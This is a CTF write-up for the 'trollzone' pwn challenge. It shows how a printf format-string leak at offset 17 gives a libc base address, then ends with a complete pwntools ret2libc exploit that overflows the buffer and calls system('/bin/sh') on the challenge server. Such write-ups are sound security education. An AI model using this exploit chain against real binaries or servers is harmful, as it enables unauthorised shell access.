![Screenshot 2025-02-24 160120](https://github.com/user-attachments/assets/bc7feb06-104b-4699-8826-2d5877a9ab33) \
Solved by : Relster
# Technique = Format string leak & Ret2libc

## 1. Checking given file.
Given a zip file that contains 3 files which are _vuln_, _libc.so.6_, and _ld-linux-x86-64.so.2_ \

Checking binary protection.
```bash
[*] '/home/relster/Desktop/ctf/kashi/pwn/trollzone/chall/vuln'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```
This challenge is pretty trivial like most ret2libc challenges out there. The only difference is that, leaked address would n


## 2. Patching & Analyzing binary.
Patch:\
```bash
~/Desktop/ctf/pwninit    # You can change this according to where you put your pwninit
```
This should give us the __vuln_patched__ binary.\
\
Running binary:\
![pic_1](https://github.com/user-attachments/assets/5568ec12-50b6-48ae-a01d-bd34a19fc60d) \
If we continue leaking using '_%p_' format specifier, we'll find an address which still located within the _libc_ memory area and the offset is at the 17th offset (_%17$p_). Note that the address is still in _libc_ memory area but we that leaked address is not a _libc_ _function_ so we'll have to debug it in **GDB** to see nearest address that's a _libc function_. You'll see what i mean in the next image.

Debugging in **GDB**:\
Let's put a __breakpoint__ here and _run_ it.
![Screenshot 2025-02-27 124235](https://github.com/user-attachments/assets/9ddce0c6-ff56-4148-8cf9-88df4a74dc39)

Type _ni_ and we will be asked for the input, and we'll type _%17$p_ to leak the address as i mention above.
![image](https://github.com/user-attachments/assets/aa93c0b0-2864-439e-9bdf-cdf530c1a180)

We'll copy that _leaked address_ (_0x7ffff7e0924a_ in this case) and examine nearby address that is hopefully some _libc function_ so that we can subtract the offset of that function to get the base address of _libc_.


We can see that the leaked address is close to ___libc_start_main_, from here we just need to do some basic pointer arithmetic to get the address of ___libc_start_main_.\
![image](https://github.com/user-attachments/assets/1a33da72-a825-40f0-bfaa-d4a217858492)

It's _0x36_ bytes or 54 bytes in difference between _0x7ffff7e0924a_ and ___libc_start_main_.
![image](https://github.com/user-attachments/assets/21976e45-ad26-46c5-84bb-1c5e75a48f80)


From here it's just trivial like traditional _**ret2libc**_ challenges, we'll just subtract the address of ___libc_start_main_ with its offset and voila we get the base address of _libc_.


## 3. Final Exploit
```python
#!/usr/bin/env python

from pwn import *

context.arch = 'amd64'

TARGET = './vuln_patched'
HOST = 'kashictf.iitbhucybersec.in'
PORT = 55698

elf = ELF(TARGET)
libc = ELF('./libc.so.6')
ld = ELF("./ld-linux-x86-64.so.2")

if not args.REMOTE:
  p = process(TARGET)
else:
  p = remote(HOST, PORT)

#context.log_level = 'DEBUG'

gdb_script = f"""
    break *main
"""
#gdb.attach(p, gdbscript=gdb_script)

# ===================================== #


# STAGE 1 : Leak address from stack using 'printf format string'

fmtstr = b'%17$p'   # leaked libc address is at 17th offset

rop = ROP(elf)
ret = rop.find_gadget(['ret'])[0]
libc_start_offset = libc.symbols['__libc_start_main']
system_offset = libc.symbols['system']
binsh_offset = next(libc.search(b"/bin/sh\x00"))

print("Offsets:")
print(f"__libc_start_main : {hex(libc_start_offset)}")
print(f"system            : {hex(system_offset)}")
print(f"/bin/sh           : {hex(binsh_offset)}")
print("==================================")

payload = flat(
    fmtstr,
)
p.sendline(payload)


# STAGE 2 : Clean up the leaked address

p.recvuntil(b'not giving you ')

# Leaking address and find libc base address
leak = p.recvuntil(b'\n').strip().decode()
libc_start_main = int(leak, 16) + 0x36  # this is adjacent (not very adjacent, but close) to the function '__libc_start_main', their difference is 0x36 bytes
libc_base = libc_start_main - libc_start_offset
system = libc_base + system_offset
binsh = libc_base + binsh_offset

print(f"leaked address    : {leak}")
print(f"__libc_start_main : {hex(libc_start_main)}")
print(f"libc_base         : {hex(libc_base)}")
print(f"system            : {hex(system)}")
print(f"binsh             : {hex(binsh)}")


# STAGE 3 : Craft payload from leaked addresses and send it to remote server

# Find pop rdi; ret; in libc
rop_libc = ROP(libc)
pop_rdi = rop_libc.find_gadget(['pop rdi', 'ret'])[0]
pop_rdi_addr = libc_base + pop_rdi

# Overflow, set up rdi register with '/bin/sh' string, call system()
pop_shell = flat(
    'A' * 40,
    ret,
    pop_rdi_addr,
    binsh,
    system
)
p.sendline(pop_shell)

p.interactive()
p.close()

# NOTE:
# Format string leak & Ret2libc
```

## 4. Result
Local:\
![image](https://github.com/user-attachments/assets/ee77ef4a-bdd4-452e-b978-b7a79e387b60)

Remote:\
![image](https://github.com/user-attachments/assets/ef5bcc65-ac08-4174-ac85-c76d4bc2bcb7)
Note : I was writing this writeup when the challenge is done, so no flags but the exploitation remains the same.

## Keyword
ret2libc \
_printf_ format string leak
